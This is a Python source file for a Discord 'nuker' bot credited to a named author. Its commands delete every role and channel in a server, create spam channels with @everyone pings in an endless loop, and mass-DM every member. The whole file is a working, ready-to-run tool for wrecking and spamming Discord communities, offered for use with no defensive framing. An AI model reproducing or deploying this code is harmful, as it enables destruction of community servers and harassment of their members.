import discord, os
from discord.ext import commands
from discord.utils import get
from colorama import Fore

r = Fore.MAGENTA

print(f"""{r}
███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ \n████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗\n██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝\n██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗\n██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║\n╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{r}-------------------------------------------\n{r}| {r}sumzum#1827 {r}|{r} https://github.com/sumzum |{r}\n{r}-------------------------------------------\n
{r}""")

TOKEN = input("Input Bot Token: ")
SPAM_MESSAGE = input("Input your Spam Message: ")
CHANNEL_SPAM = input("Input Spam Create Channel Name: ")
DM_ALL = input("Input Dm Message for all Members: ")

bot = commands.Bot(command_prefix="." ,help_command=None, intents=discord.Intents.all())
bot.remove_command('help')

@bot.event
async def on_ready():
    print(Fore.MAGENTA + """
bot is ready for nuke │ .help (show commands in server)

Commands:
1. .delroles (deletes all roles)
2. .kill server (nukes server)
3. .dmall (dm all server members)
4. .clear (deletes all channels)
""")

@bot.command()
async def help(ctx, member:discord.Member=None):
     if member:
       embed=discord.Embed(title="Nuker Help", description="made by sumzum#1827", color=0xcbceff)
       embed.add_field(name="Delete Roles:", value="!delroles")
       embed.add_field(name="Nuke Server:", value="!kill server")
       embed.add_field(name="Dm Members:", value="!dmall")
       embed.add_field(name="Delete Channels:", value="!clear")
       await ctx.send(embed=embed)
     else:
       embed=discord.Embed(title="Nuker Help", description="made by sumzum#1827", color=0xcbceff)
       embed.add_field(name="Delete Roles:", value="!delroles")
       embed.add_field(name="Nuke Server:", value="!kill server")
       embed.add_field(name="Dm Members:", value="!dmall")
       embed.add_field(name="Clear Server:", value="!clear")
       await ctx.send(embed=embed)
  
@bot.command()
async def delroles(ctx):
 for role in ctx.guild.roles:  
     try:  
        await role.delete()
     except:
        print(Fore.MAGENTA + f"Cannot delete {role.name}")

@bot.command()
async def kill(ctx, arg: str):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
     await channel.delete()  
    allowed_mentions = discord.AllowedMentions(everyone = True)
    guild = ctx.message.guild
    while True:
        channel = await guild.create_text_channel(CHANNEL_SPAM)
        await channel.send(content = SPAM_MESSAGE, allowed_mentions = allowed_mentions)

@bot.command()
async def dmall(ctx):
        for user in ctx.guild.members:
            try:
                await user.send(DM_ALL)
            except:
                 print(Fore.MAGENTA + f"Cannot DM{user.name}")

@bot.command()
async def clear(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
     await channel.delete()  
    guild = ctx.message.guild
    await guild.create_text_channel("sumzum#1827")

bot.run(TOKEN) 
